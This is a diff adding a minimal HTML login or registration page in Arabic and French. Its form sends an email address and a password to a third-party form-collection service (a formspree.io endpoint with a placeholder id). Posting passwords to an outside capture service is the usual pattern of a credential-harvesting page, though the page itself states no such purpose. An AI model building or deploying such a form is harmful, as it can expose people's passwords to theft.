@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>تسجيل</title>
+</head>
+<body>
+  <h2>مرحبا بيك</h2>
+  <form action="https://formspree.io/f/xxxxxxx" method="POST">
+    <input type="email" name="email" placeholder="Email" required><br><br>
+    <input type="password" name="password" placeholder="Mot de passe" required><br><br>
+    <button type="submit">تسجيل</button>
+  </form>
+</body>
+</html>
